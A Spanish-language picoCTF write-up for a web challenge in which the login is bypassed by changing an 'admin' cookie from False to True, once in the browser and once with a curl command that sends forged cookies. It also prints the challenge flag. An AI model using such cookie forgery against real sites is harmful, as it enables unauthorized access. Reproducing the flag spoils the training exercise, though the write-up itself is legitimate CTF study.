### Descripción
The factory is hiding things from all of its users. Can you login as Joe and find what they've been looking at? `https://jupiter.challenges.picoctf.org/problem/13594/` ([link](https://jupiter.challenges.picoctf.org/problem/13594/)) or http://jupiter.challenges.picoctf.org:13594

Hints:
1. Hmm it doesn't seem to check anyone's password, except for Joe's?

### Solución
Primero es necesario ingresar con el usuario joe y password joe pero aún no se muestra la flag.
Después, al inspeccionar la página hay que ir al apartado de Application, después a ver las cookies para modificar el admin de False a True y finalmente se recarga la página para ver los cambios realizados.

Ahora se muestra lo siguiente:
**Flag**: `picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}`

**Solución 2**
Usando Webshell:

```
Sebas115-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/13594/flag -H "Cookie: usernn; password=juan; admin=True" | grep pico
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1312  100  1312    0     0   4871      0 --:--:-- --:--:-- --:--:--  4859
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}</code></p>      
```

picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}

### Notas adicionales


### Referencias
https://webshell.picoctf.org/